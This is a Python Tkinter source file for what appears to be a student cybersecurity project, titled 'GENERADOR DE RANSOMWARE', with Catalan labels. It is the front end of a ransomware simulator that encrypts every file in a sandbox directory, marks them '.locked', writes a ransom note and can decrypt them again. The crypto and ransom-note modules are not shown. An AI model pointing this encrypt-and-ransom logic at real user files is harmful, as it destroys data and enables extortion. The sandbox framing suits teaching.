import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
from PIL import Image, ImageTk


import crypto_engine
import file_manager
import config 

class AplicacioHacker:
    def __init__(self, finestra):
        self.finestra = finestra
        self.finestra.title("TERMINAL DE CIBERSEGURETAT - ENTI UB")
        self.finestra.geometry("1000x600")
        self.finestra.resizable(False, False) 
        
        self.color_fons = "#000005"
        self.color_text = "#00FF00"
        self.color_boto = "#1a1a1a"
        
        self.finestra.configure(bg=self.color_fons)
        self.finestra.protocol("WM_DELETE_WINDOW", self.sortida_segura)
        
        self.txt_consola = None 
        self.pantalla = None
        self.pantalla_inici()

    def netejar(self):
        if self.pantalla:
            self.pantalla.destroy()

    def pantalla_inici(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")

        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

       
        if os.path.exists(config.FILE_LOGO):
            try:
               
                img_bruta = Image.open(config.FILE_LOGO)
                img_neta = img_bruta.resize((400, 280), Image.LANCZOS)
                self.logo_img = ImageTk.PhotoImage(img_neta)
                
            
                tk.Label(contingut, image=self.logo_img, bg=self.color_fons).pack(pady=10)
            except Exception as e:
                print(f"Error carregant el logo: {e}")

        tk.Label(contingut, text="GENERADOR DE RANSOMWARE", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 28, "bold")).pack(pady=10)
        
        tk.Label(contingut, text="MARC FERNANDEZ - MARTI OLIVER", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 16)).pack(pady=5)

        tk.Label(contingut, text="[ PREM ESPAI PER ACCEDIR AL SISTEMA ]", 
                 fg="#ffffff", bg=self.color_fons, font=("Consolas", 18)).pack(pady=40)

        self.finestra.bind("<space>", self.anar_a_menu)

    def anar_a_menu(self, event):
        self.finestra.unbind("<space>")
        self.pantalla_menu()

    def pantalla_menu(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        opcions = [
            ("EXECUTAR INFECCIO", self.accions_infectar),
            ("RECUPERAR DADES", self.accions_recuperar),
            ("CONSULTAR LOGS", self.accions_historial),
            ("TANCAR TERMINAL", self.sortida_segura)
        ]

        for text, comanda in opcions:
            tk.Button(contingut, text=text, width=35, height=2,
                      bg=self.color_boto, fg=self.color_text, font=("Consolas", 12, "bold"), command=comanda).pack(pady=10)

    def crear_consola(self, titol):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        tk.Label(self.pantalla, text=f"> {titol}", fg=self.color_text, bg=self.color_fons, font=("Consolas", 14)).pack(pady=10)
        self.txt_consola = scrolledtext.ScrolledText(self.pantalla, width=110, height=25, bg="#050505", fg=self.color_text, font=("Consolas", 10), state="disabled")
        self.txt_consola.pack(pady=10, padx=20)
        tk.Button(self.pantalla, text="[ TORNAR ]", bg=self.color_boto, fg=self.color_text, command=self.pantalla_menu).pack(pady=5)

    def afegir_a_consola(self, missatge):
        if self.txt_consola:
            self.txt_consola.config(state="normal")
            self.txt_consola.insert(tk.END, missatge + "\n")
            self.txt_consola.see(tk.END)
            self.txt_consola.config(state="disabled")

    def sortida_segura(self):
        if messagebox.askyesno("SORTIDA", "SEGUR QUE VOLS TANCAR?"):
            self.finestra.quit()

  
    def accions_infectar(self):
        self.crear_consola("EXECUTANT SIMULACIO DE MALWARE...")
        try:
            target = config.SAND_DIR
            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
            clau = crypto_engine.carregar_clau(config.FILE_KEY)
            
            fitxers = file_manager.llistar_fitxers(target)
            self.afegir_a_consola(f"DEBUG: Fitxers detectats a la sandbox: {len(fitxers)}")
            self.afegir_a_consola("Iniciant generacio de clau...")
            self.finestra.update() 
            
            comptador = 0
            for f in fitxers:
                nom = os.path.basename(f)
                if not f.endswith(".locked") and not f.endswith(".py") and "INSTRUCCIONS" not in nom:
                    crypto_engine.xifrar_arxiu(f, clau)
                    self.afegir_a_consola(f"SIMULACIO COMPLETADA: {nom} xifrat")
                    
                
                    file_manager.registrar_log("FITXER_XIFRAT", nom)
                    
                    comptador += 1
                    self.finestra.update()

        
            file_manager.generar_nota_rescat(target)
            self.afegir_a_consola(f"\n--- PROCES FINALITZAT AMB EXIT ({comptador} fitxer/s) ---")
            
        except Exception as e:
            self.afegir_a_consola(f"ERROR: {e}")

    def accions_recuperar(self):
        self.crear_consola("RECUPERANT DADES...")
        try:
            clau = crypto_engine.carregar_clau(config.FILE_KEY)
            fitxers = file_manager.llistar_fitxers(config.SAND_DIR)
            
            self.afegir_a_consola(f"DEBUG: Fitxers a la sandbox: {len(fitxers)}")
            self.finestra.update()
            
            comptador = 0
            for f in fitxers:
                if f.endswith(".locked"):
                    nom_net = os.path.basename(f)
                    crypto_engine.desxifrar_arxiu(f, clau)
                    self.afegir_a_consola(f"RESTAURAT: {nom_net}")
                    
             
                    file_manager.registrar_log("FITXER_DESXIFRAT", nom_net)
                    
                    comptador += 1
                    self.finestra.update()

            self.afegir_a_consola(f"\n--- EXIT: {comptador} fitxer(s) recuperat(s) ---")
        except Exception as e:
            self.afegir_a_consola(f"ERROR: {e}")

    def accions_historial(self):
        self.crear_consola("ACCEDINT ALS REGISTRES DEL SISTEMA...")
        try:
       
            ruta_logs = config.FILE_LOGS
            
            if os.path.exists(ruta_logs):
                with open(ruta_logs, "r", encoding="utf-8") as f:
                    linies = f.readlines()
                    
                if not linies:
                    self.afegir_a_consola("L'historial de registres esta buit.")
                    return

                self.afegir_a_consola(f"S'han trobat {len(linies)} entrades de registre:\n")
                self.afegir_a_consola("-" * 60)
                
                
                for linia in reversed(linies):
                    self.afegir_a_consola(f"> {linia.strip()}")
            else:
                self.afegir_a_consola("ERROR: No s'ha trobat el fitxer de logs a la carpeta data/logs.")
                
        except Exception as e:
            self.afegir_a_consola(f"ERROR al llegir els registres: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    AplicacioHacker(root)
    root.mainloop()
